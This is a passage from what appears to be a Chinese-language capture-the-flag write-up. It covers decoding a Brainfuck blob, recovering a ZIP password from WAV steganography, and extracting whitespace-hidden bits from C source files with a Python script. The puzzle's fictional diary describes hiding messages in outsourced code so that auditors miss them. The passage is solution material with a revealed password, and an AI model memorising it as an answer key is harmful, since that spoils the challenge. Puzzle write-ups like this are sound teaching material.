;++.&lt;----.&lt;&lt;--.&gt;&gt;&gt;++.--.&lt;----.&gt;---.-.+.&lt;++++.&gt;&gt;&gt;&gt;--.&lt;&lt;+.&lt;&lt;&lt;&lt;++.+++.&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;+.&lt;&lt;+++++.-.&gt;&gt;&gt;&gt;---.&lt;.&lt;&lt;&lt;+.&gt;&gt;-.&lt;&lt;------.&gt;&gt;&gt;+.&lt;&lt;------.&gt;+.&lt;&lt;&lt;-----.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;+.-.&gt;&gt;----.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;++.&gt;-.&gt;&gt;++.&lt;&lt;---.&gt;+++.&lt;-.&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;-.&gt;&gt;+.&lt;&lt;+++++++++.&lt;&lt;.&gt;&gt;+++.&lt;&lt;&lt;--.&gt;&gt;&gt;--.&gt;&gt;+.&lt;&lt;+++.-.------.&gt;++.&lt;&lt;&lt;.&gt;----.&lt;&lt;+++++++.&gt;&gt;&gt;&gt;--.----.&lt;&lt;+.&gt;&gt;&gt;+.---.&lt;&lt;+++++++.&lt;&lt;&lt;--------.++++++++.&gt;&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;++.&lt;&lt;.-.&gt;&gt;&gt;&gt;-.&lt;&lt;.&lt;&lt;.&lt;&lt;.&gt;&gt;&gt;&gt;&gt;&gt;-----.&lt;&lt;&lt;.--.&gt;&gt;+++.&gt;+.&lt;&lt;&lt;------.&lt;-.&lt;+.&gt;+++.&gt;+++.&lt;&lt;+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;--.&gt;&gt;---.&lt;&lt;&lt;--------.+++++++.&gt;&gt;&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;--.&lt;&lt;&lt;---.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;---.+++.&lt;&lt;-.&gt;&gt;&gt;++.&lt;+++++++.&lt;&lt;&lt;------.&gt;&gt;&gt;------.&gt;++.----.&lt;&lt;--.-.&gt;&gt;++.---.&lt;&lt;&lt;&lt;+.&gt;&gt;&gt;.&gt;&gt;--.&lt;.&gt;++++++.&lt;&lt;-.&lt;&lt;-.&gt;&gt;+++++++.&lt;&lt;&lt;--.++++++++.&gt;&gt;&gt;&gt;&gt;.&lt;-.&lt;-.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;+.&lt;&lt;&lt;------.&gt;&gt;++++++++.&lt;&lt;---.&gt;&gt;&gt;+.-.&lt;----.&lt;&lt;.&gt;&gt;&gt;.&lt;&lt;&lt;+.+++++++.&gt;.&gt;&gt;.&lt;&lt;&lt;-------.++++++++.&gt;&gt;&gt;&gt;&gt;---.&lt;+.&lt;&lt;&lt;&lt;-------.+++++++.&gt;&gt;&gt;&gt;+++.-----.&lt;&lt;---.-.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;++.&lt;+.&gt;&gt;&gt;&gt;+++.&lt;+.&lt;&lt;&lt;&lt;.&gt;-.&lt;&lt;.&gt;&gt;++++.&gt;------.&lt;&lt;&lt;--------.++++++++.&gt;&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;+++.&lt;&lt;---.&gt;--.&gt;&gt;++++.&lt;--.&gt;----.&lt;&lt;&lt;&lt;&lt;.--------.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;+.&gt;&gt;&gt;++++.&gt;&gt;-.&lt;&lt;&lt;&lt;.&gt;-.&lt;&lt;+++++++.&gt;&gt;&gt;&gt;+++.----.&lt;&lt;+.&gt;&gt;&gt;+.---.&lt;&lt;+++.&lt;&lt;&lt;--------.++++++++.&gt;&gt;&gt;&gt;&gt;+.&lt;+.&lt;&lt;&lt;&lt;------.&gt;&gt;&gt;---.&gt;+++.-----.&lt;+.&lt;&lt;&lt;++.&gt;&gt;&gt;&gt;&gt;++++++.&lt;+++.&lt;&lt;&lt;.+.&gt;&gt;&gt;++.&lt;+.&lt;&lt;&lt;---.&gt;&gt;+++.&gt;&gt;&gt;&gt;.&lt;&lt;---.&lt;&lt;&lt;&lt;-.++++++++.&gt;&gt;&gt;&gt;&gt;&gt;.&lt;&lt;+.&lt;&lt;---.-.&gt;&gt;&gt;&gt;-.&lt;&lt;.&lt;&lt;&lt;-.+.&gt;&gt;&gt;&gt;++++.&lt;&lt;+.--.&gt;++++++++.&gt;+.&lt;&lt;&lt;&lt;-.&gt;.&lt;&lt;.&gt;&gt;+++++.&gt;&gt;--------.++++++++.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;----.+++++++.---.&gt;--------.&gt;-----.&lt;-.&lt;&lt;&lt;&lt;------.&gt;&gt;&gt;-----.&gt;&gt;----.&lt;.&gt;-.&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;------.&lt;&lt;&lt;+++++++.-.&lt;.&gt;&gt;&gt;&gt;+++++++.&lt;&lt;&lt;++.--.&lt;-.&lt;.&gt;&gt;.&lt;&lt;&lt;--.++++++++.&gt;&gt;&gt;---.-.+.&lt;+.&gt;&gt;+++.&lt;---.+++.&lt;&lt;&lt;----.&gt;++++.&gt;&gt;+++.&lt;&lt;&lt;----.+++++++.&gt;----.&gt;&gt;.&lt;&lt;&lt;--------.&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;---.-.++.&lt;&lt;--------.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;++++.---.&gt;--.&gt;++++.&lt;-.&lt;&lt;&lt;&lt;+++.&gt;&gt;++++.&gt;&gt;&gt;----.&lt;.&gt;.&lt;&lt;&lt;.----.+++.&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;&gt;-.--.&lt;&lt;-.&gt;+.&lt;&lt;-.-.++++.--.&lt;-------.&gt;&gt;&gt;&gt;---.&lt;&lt;&lt;+++.&lt;+++++++.&lt;+++++++++.&gt;&gt;&gt;&gt;&gt;+++++++.&lt;&lt;.&lt;&lt;&lt;+++++.&gt;&gt;----.&gt;&gt;-.&lt;+.&lt;&lt;&lt;--.---.-.&gt;+.&lt;&lt;--.&gt;&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;--------.&gt;-----.&gt;&gt;-.&lt;&lt;---.&gt;+++.&lt;-.&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;-.&gt;&gt;+.&lt;&lt;+++++++++.&lt;&lt;..++.&lt;+.&gt;&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;-.&lt;++.&lt;&lt;&lt;----.-.&gt;&gt;&gt;++.--.&lt;-.&lt;--.&gt;+++.&gt;&gt;&gt;++++.&lt;&lt;&lt;++.&lt;&lt;.&gt;&gt;&gt;&gt;--.&gt;.&lt;&lt;&lt;++++.&gt;&gt;+++++.&lt;++.&gt;-.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;-----.&lt;&lt;----.&lt;&lt;&lt;&lt;++.&gt;&gt;&gt;&gt;+++++.&gt;&gt;+++++.&lt;&lt;----.&lt;&lt;&lt;+++++++.++.&lt;--.&gt;&gt;&gt;.--.&lt;&lt;-.--------.&gt;------.&gt;&gt;&gt;-.-.&gt;-----.&lt;&lt;.&lt;&lt;-----.&gt;-.&gt;&gt;&gt;++++.&lt;&lt;-.&lt;&lt;&lt;..&gt;&gt;&gt;&gt;&gt;----.&lt;&lt;-.&gt;+.&lt;&lt;&lt;&lt;--------.&lt;.&gt;&gt;&gt;++++.-------.&lt;&lt;----.&gt;-----.&gt;--.&gt;&gt;--..&gt;-.&lt;&lt;++.&lt;&lt;+++++.-.&gt;&gt;&gt;+++.&lt;&lt;&lt;-----.++.&lt;.&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;--.&lt;&lt;&lt;--.&gt;&gt;+.&gt;&gt;--.&lt;&lt;------.&gt;&gt;+.&lt;++.&gt;&gt;.&lt;&lt;.&lt;+++++++.&lt;&lt;++.&gt;&gt;&gt;&gt;----.&lt;.&lt;++++.&gt;&gt;+++.&gt;--.&lt;&lt;&lt;+++.&lt;.&lt;&lt;+.&gt;&gt;&gt;&gt;&gt;&gt;---.&lt;&lt;&lt;.&lt;--..&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;.&lt;&lt;&lt;+.&gt;.&lt;-.&gt;&gt;+++++++++++.&gt;&gt;&gt;+.&lt;++++..-----.&lt;&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;++++.&lt;&lt;-----------.+++++++++++.&gt;&gt;&gt;.&lt;&lt;&lt;++++++.&lt;.&gt;&gt;&gt;-----.&gt;+.&lt;&lt;&lt;----.&lt;.&gt;&gt;&gt;.&lt;&lt;+++.&lt;++++++++++++.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;.&lt;&lt;+++++++.&gt;&gt;&gt;&gt;--.&gt;.&lt;&lt;+.&lt;&lt;&lt;&lt;+.&gt;&gt;+.&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;&lt;&lt;-------.++.&lt;++.&gt;&gt;&gt;&gt;&gt;++.&lt;-.&gt;.&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;----.&lt;&lt;++.&gt;-.&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;++++.&lt;&lt;-.&lt;&lt;&lt;&lt;---.&gt;&gt;&gt;&gt;&gt;-.&gt;---.&lt;&lt;-.+++++.&lt;&lt;&lt;--.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;.&lt;&lt;&lt;.+++.----.&gt;&gt;----------.&gt;&gt;&gt;++.&lt;&lt;.&gt;&gt;--.&lt;----.&gt;++.&lt;&lt;&lt;++.&gt;&gt;&gt;++.&lt;-.&lt;&lt;&lt;&lt;+.+++.&gt;&gt;&gt;&gt;++++.---.++++.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;----.&gt;---.&lt;&lt;----.&gt;&gt;&gt;--.&lt;&lt;&lt;+++.&lt;+++++.&lt;&lt;.&gt;&gt;&gt;&gt;&gt;--.&lt;++.&lt;--.&lt;&lt;&lt;-.&gt;.&gt;-------.&gt;&gt;&gt;+++.&lt;&lt;&lt;--.&gt;&gt;&gt;--.&lt;---.&lt;&lt;---.--.&gt;&gt;&gt;&gt;++.&lt;&lt;+.&lt;&lt;++.&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;&lt;&lt;----.&gt;.++.&lt;+++++.&gt;&gt;&gt;&gt;&gt;++++.&lt;-.&gt;---.-.&lt;&lt;&lt;&lt;&lt;-----.&gt;--.++.&lt;+++++.&gt;&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;.&lt;&lt;+.&gt;------.&gt;&gt;&gt;--.&lt;&lt;--------.&lt;&lt;&lt;&lt;---.+++++++.---------.&gt;--.++.&lt;+++++.-----.&gt;&gt;&gt;&gt;.--.&gt;----.&lt;&lt;&lt;&lt;&lt;.&gt;--.++.&lt;+++++.&gt;&gt;&gt;&gt;&gt;+++++.&lt;+++++++++.&lt;++++++.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;--.++.&lt;.&gt;&gt;&gt;&gt;&gt;&gt;++++.&lt;&lt;+.&lt;&lt;&lt;&lt;---.&gt;&gt;&gt;-----.&gt;++++++.----.&lt;&lt;-.&lt;++.----.&gt;+++++.&gt;&gt;&gt;---.&lt;&lt;++++.&gt;&gt;++.&lt;&lt;++.&lt;&lt;&lt;.&gt;&gt;&gt;++.&gt;&gt;&gt;.&lt;&lt;&lt;-.--.&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;---.&lt;&lt;+.&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;++++.&gt;-.&lt;-----.++++.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;++.---.&gt;+.--.&lt;+++.&gt;&gt;+++.&lt;&lt;&lt;--.&gt;&gt;++.------.&lt;---.--.&lt;&lt;.&gt;++.&gt;&gt;&gt;-.-.&gt;.&lt;&lt;-.&lt;+++.&lt;++++++.&gt;&gt;+++++.&lt;+.-.&lt;--------.&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;+.-.&gt;&gt;-.&lt;&lt;&lt;&lt;.&gt;++.&gt;&gt;&gt;++.&lt;&lt;++.&gt;&gt;+++.&lt;----.&gt;---.-.&lt;++++.&lt;-.-.&lt;--.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;+.-.&gt;&gt;-.&lt;&lt;&lt;&lt;.&gt;++.&gt;&gt;&gt;++.+++.&lt;++++.-------.++++.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;++.&lt;----.&gt;&gt;&gt;----.&gt;.&lt;&lt;&lt;-.--.&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;++++.&lt;&lt;++.&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;+.&lt;&lt;&lt;+.+++++++.---------.&gt;&gt;++++.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;---.&lt;&lt;&lt;-..&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;.&lt;-----.-.&lt;&lt;.&gt;&gt;&gt;-.--------.&lt;&lt;.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;++++++++.&gt;&gt;.&lt;&lt;&lt;++++++++.&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;&lt;.++.&lt;+++++.&gt;&gt;&gt;&gt;&gt;----.&lt;--.&lt;&lt;&lt;&lt;---.-.&gt;&gt;&gt;&gt;&gt;&gt;------.&lt;&lt;&lt;+.---.&lt;&lt;&lt;++++.-----.&gt;--.......................................................................................&gt;&gt;&gt;.&lt;&lt;&lt;.....&gt;+++.&lt;....++++++++.--------.........&gt;--.&lt;.&gt;-----.&lt;........&lt;++++.&gt;.&gt;&gt;&gt;&gt;---.&lt;&lt;&lt;&lt;.......+.&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;&lt;-....................+.-....................&gt;-.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;....&gt;&gt;&gt;+.&lt;&lt;&lt;....++.--.........&gt;---.&gt;------.&lt;&lt;++.&gt;&gt;.&lt;&lt;--.......&gt;&gt;+++++.&lt;&lt;.&gt;+++.&lt;........&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;....................+.-....................+++.+.----....&gt;-.&lt;.....&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;........+.&lt;----.&gt;-.&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;&lt;.......&gt;.&gt;-----.&lt;&lt;++.--........&gt;++.&lt;.....................&gt;&gt;.&lt;&lt;...................+.+++.----....--------.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;&lt;-..&gt;&gt;&gt;&gt;-.&gt;&gt;+.&lt;&lt;&lt;&lt;-.&lt;++++++++.........&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;.&gt;+.&lt;.......++.&gt;&gt;++++++++.&lt;&lt;--.&gt;&gt;&gt;+++++.&lt;&lt;&lt;.......+.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;-.........+.&gt;+++++++.&lt;-.........++++++++.--------....................&gt;+++.&gt;&gt;.&lt;&lt;&lt;....&gt;&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;&lt;....++.--.........&gt;--------.&gt;&gt;.&lt;&lt;&lt;++.&gt;+++++.&lt;--.......&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;.++++++++.--------.......+.&lt;+++++.&gt;-..........&gt;&gt;.&lt;&lt;....+.-....++.--..........&gt;&gt;.&lt;&lt;.........+++++.&gt;&gt;.&lt;&lt;-----....+++.---.....&gt;&gt;&gt;.&lt;&lt;&lt;.........&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;.&lt;----.&gt;.......+++.---.+++.---........&gt;.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;....................++++.----...................+.&gt;&gt;&gt;--.&lt;&lt;&lt;-....&lt;-....&gt;&gt;&gt;&gt;---.&gt;&gt;.&lt;&lt;&lt;&lt;&lt;++++++++.--------.........&gt;&gt;&gt;++.&lt;&lt;&lt;.&gt;---.&lt;.......+.&lt;+.&gt;-.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;........&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;.........+.&gt;+++.&lt;-.........++.--..........++++++++.--------.........&gt;&gt;&gt;---.&gt;&gt;.&lt;&lt;&lt;&lt;&lt;...&gt;-.&lt;&lt;+++++++.--------..+++.++++++.&gt;++.--.........&gt;-------.&lt;.+++.&gt;++++++++.&lt;---.......&gt;&gt;&gt;++++++.&lt;&lt;&lt;.&gt;----.&lt;........&gt;&gt;&gt;.&lt;&lt;&lt;..........&gt;&gt;.&lt;&lt;....+.-....++.--....................&gt;-----.&gt;&gt;&gt;.&lt;&lt;&lt;&lt;....&gt;---.&lt;.....&gt;&gt;&gt;.&lt;&lt;&lt;........++.&gt;&gt;&gt;.&lt;&lt;&lt;--.&lt;--------.&gt;.......&gt;++++++.&lt;.+++.---........&gt;----.&lt;..........&gt;-.&lt;..........&gt;&gt;&gt;.&lt;&lt;&lt;.........&gt;+.&lt;.........++.++.----....+.-....&gt;--.++++.&lt;.........&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;.&gt;+++++.&lt;.......++.&lt;++++.&gt;--.&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;.......++++.&gt;&gt;&gt;.&lt;&lt;&lt;----.........+.&gt;+++.&lt;-...+.&gt;&gt;&gt;.&lt;&lt;&lt;-....++++++++.--------.........+.&gt;&gt;&gt;.&lt;&lt;&lt;-.........&gt;&gt;&gt;+++.---.&lt;&lt;&lt;....++++.----....++++++.------...........++++.&gt;.&lt;----.........&gt;.&lt;........&gt;&gt;&gt;------.&lt;&lt;&lt;....................+.-....................++++++++.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;--------....+.-....+.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;-.........&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;+.+++.----.......++.--.++++.----........&gt;.&lt;....................+.-..........++++.----.........++.&gt;++++.&lt;--.....&gt;----.&lt;....&gt;&gt;.&lt;&lt;.........&gt;&gt;.&lt;&lt;.&gt;+.&lt;.......+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.-.........&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;....................++++++++.--------....................&gt;&gt;&gt;&gt;+++++++.&lt;&lt;&lt;-.&lt;....++++.----....++++++.------.........+++++++.-------.++++.&gt;.&lt;----.......&gt;&gt;&gt;++.&lt;&lt;&lt;.&gt;.&lt;.......+++.&gt;&gt;&gt;&gt;-----.&lt;&lt;&lt;&lt;---.&gt;.&lt;..................++++.----....................&gt;------.++.&lt;....+.-....+.&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;-........+.&gt;&gt;----.&lt;&lt;.&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;&lt;-.......+++++.&gt;++++.&lt;+.------........++.&gt;.&lt;--....................&gt;.&lt;...................++.&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;--.....&gt;.&lt;....++++++++.--------.........&gt;&gt;++++.&lt;&lt;.&gt;&gt;+.&lt;&lt;.......+.&gt;&gt;&gt;++++.&lt;&lt;&lt;.&gt;&gt;&gt;.&lt;&lt;&lt;-.......+++++++.+.--------....................++++++++.--------....................&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;.&lt;....++++.----....++.--.........&gt;---.+++.&lt;++++++.&gt;.&lt;------.......&lt;---.&gt;.&gt;&gt;-.&lt;&lt;........&lt;-.&gt;....................+.-....................&gt;-----.&lt;&lt;++++++++.&gt;....+.-.....&gt;&gt;&gt;.&lt;&lt;&lt;.........&gt;---.&lt;+.&lt;--------.&gt;-........&gt;&gt;&gt;.&lt;&lt;-.&lt;........--------.&gt;-------.....................&gt;&gt;.&lt;&lt;...................+++.++++++.&lt;++++++++....+++.&gt;&gt;&gt;.&lt;&lt;&lt;---....&gt;+++.&lt;.........++++.----.&lt;+++++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;.......&gt;++++.&lt;+++.&gt;&gt;&gt;.&lt;&lt;&lt;---........&gt;&gt;&gt;.&lt;&lt;&lt;....................++++++++.--------....................&lt;----.&gt;&gt;.&lt;....&lt;+++++++.&gt;....+++.---.........+.&gt;&gt;&gt;.&lt;&lt;--.&gt;.&lt;&lt;-.......++++++.------.&lt;----.&gt;........&gt;------.&lt;....................++.--....................&gt;++++++.&lt;++++.----....+.-.....&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;.........&gt;&gt;&gt;.&lt;&lt;&lt;+++.&gt;&gt;&gt;++++++.&lt;&lt;&lt;---.......++.--.&gt;.&lt;........++.--.....................&gt;&gt;&gt;------.&lt;&lt;&lt;...................+++.&gt;&gt;&gt;++++++.&lt;&lt;&lt;---....+.&gt;&gt;&gt;------.&lt;&lt;&lt;-....&gt;--.&lt;.........&gt;--.&lt;.&lt;+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;.......&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;.&lt;&lt;&lt;---.......&gt;+++.&lt;.+.-........+.&gt;&gt;&gt;.&lt;&lt;&lt;-.........&gt;-----.&lt;.........+.-..........&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.....++++.----....+++.---.........&gt;+++++++.&gt;&gt;.&lt;&lt;.&gt;.&lt;&lt;.......&lt;----------.&gt;.---------.+++++++++........&gt;-------.&lt;....................++.--..........&gt;.&lt;.........&gt;++++++.&lt;---------.+++++++++....+.-.....&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;..........++++.++.------.........&gt;++.&lt;........&gt;----.&lt;.....................&gt;&gt;&gt;.&lt;&lt;&lt;.........++.--.........+++.&lt;+++++++++.&gt;---.....&gt;++++.&lt;....&gt;----.&lt;.........&gt;++++.&lt;+..&gt;&gt;&gt;.&lt;&lt;&lt;-......+.-.++++.----........++++++.&lt;----.&gt;------....................&gt;&gt;&gt;.&lt;&lt;&lt;....................&lt;-.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;....&gt;&gt;&gt;.&lt;&lt;&lt;....+++.---.........&gt;------.&lt;&lt;+.&gt;&gt;++++++.&gt;.&lt;&lt;.......&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;+.&lt;.........+++.---.....................&gt;-.&lt;....................&gt;----.&lt;+.-...+.-....&gt;.&lt;....................&gt;--.&lt;&lt;.&gt;&gt;++++++.&lt;........&gt;---.+++.&lt;....................++++.----..........&gt;.&lt;.........&gt;+.&lt;.....&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;........................++.&gt;-----.&lt;++++.&gt;++++.&lt;------........&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;+.-...................+.-.....................&gt;.&lt;....++++++++.--------.........................&lt;++++++.&gt;+.-........+.&lt;--.&gt;.&gt;&gt;&gt;.&lt;&lt;&lt;-.......+.&lt;.&gt;-....&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;....++.--..........&gt;&gt;.&lt;&lt;..........&gt;&gt;&gt;++++.&lt;&lt;&lt;....+++.---.........................++++++.------.&gt;&gt;-.&lt;&lt;........&gt;-----.&lt;.&gt;---.&lt;...................++++.----....................----.</span><br></pre></td></tr></table></figure>\n<p>解码后的结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>用base64解码，得到一串二进制数据：<br>![](/images/Writeup/20210831181642.png]<br>看着是ELF文件，但是执行后却是走错路了：<br>![](/images/Writeup/20210831181734.png]<br><em><strong>WDNMD</strong></em><br>再把重心放在wav文件上，用[[Silenteye]看一下隐写数据：<br>![](/images/Writeup/20210831182324.png]<br>得到了日志3的密码：This1sThe3rdZIPpwd</p>\n<h1 id=\"0x03-日志3\"><a href=\"#0x03-日志3\" class=\"headerlink\" title=\"0x03 日志3\"></a>0x03 日志3</h1><p>解压日志3，得到：<br>![](/images/Writeup/20210831182538.png]<br>先看一下md文件：</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"strong\">**8月8日**</span> 阴</span><br><span class=\"line\"></span><br><span class=\"line\">经过一个多星期的深思熟虑，我发现我们工作中完成的源代码是会经过公司专员审核然后发给其他客户的，应该是属于代码外包业务，而我们的甲方大多是正规的大公司</span><br><span class=\"line\"></span><br><span class=\"line\">因此通过源代码向外界发送求救信号是一个不错的方法</span><br><span class=\"line\"></span><br><span class=\"line\">但需要满足以下几个条件：</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"bullet\">1.</span> 加入代码隐写的部分不能影响源代码的编译</span><br><span class=\"line\"><span class=\"bullet\">2.</span> 不能很容易被公司审计专员看出来</span><br><span class=\"line\"><span class=\"bullet\">3.</span> 不能直接明文交流</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这可真让人头秃啊。。。。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"strong\">**8月16日**</span> 多云</span><br><span class=\"line\"></span><br><span class=\"line\">又过了一个多星期，👴终于想出了办法！！！！</span><br><span class=\"line\"></span><br><span class=\"line\">测试几次后，确定没有引起公司审计专员的注意，这种方法应该是没问题的，接下来就是等待了，但愿有人能发现我留在源代码的求救信息吧.........</span><br></pre></td></tr></table></figure>\n<p>那么看来是要代码审计了。。<br>在source_code文件夹里面，可以发现大量代码：<br>![](/images/Writeup/20210831182721.png]<br>看起来像是一个项目文件夹，看来是要代码审计了。。<br>以下文件中出现了可疑的控制字符，怀疑是信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\attachment\\日记3\\日记3\\source_code\\elf\\rtld.c</span><br><span class=\"line\">\\attachment\\日记3\\日记3\\source_code\\malloc\\malloc.c</span><br><span class=\"line\">\\attachment\\日记3\\日记3\\source_code\\malloc\\arena.c</span><br></pre></td></tr></table></figure>\n<p>![](/images/Writeup/20210831183943.png]<br>![](/images/Writeup/20210831184143.png]<br>![](/images/Writeup/20210831184311.png]<br>构建脚本处理数据：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">f_read</span>(<span class=\"params\">name</span>):</span></span><br><span class=\"line\">    f=<span class=\"built_in\">open</span>(name,<span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">    flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    useless=<span class=\"string\">r&quot;abcdefghijklmnopqrstuvw\\xyz;,)&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f.readlines():</span><br><span class=\"line\">        line=line.replace(<span class=\"string\">&quot;\\n&quot;</span>,<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;&#125;&quot;</span> <span class=\"keyword\">in</span> line:</span><br><span class=\"line\">            t = line.split(<span class=\"string\">&quot;&#125;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(t[<span class=\"number\">1</span>]) != <span class=\"number\">0</span>:</span><br><span class=\"line\">                x = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> useless:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> t[<span class=\"number\">1</span>]:</span><br><span class=\"line\">                        x = <span class=\"number\">0</span></span><br><span class=\"line\">                        <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> x:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> t[<span class=\"number\">1</span>]:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> s == <span class=\"string\">&#x27;\\t&#x27;</span>:</span><br><span class=\"line\">                            flag += <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">                        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                            flag += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">    f.close()      </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;*****&quot;</span>)</span><br><span class=\"line\">f_read(<span class=\"string\">&quot;rtld.c&quot;</span>)</span><br><span class=\"line\">f_read(<span class=\"string\">&quot;arena.c&quot;</span>)</span><br><span class=\"line\">f_read(<span 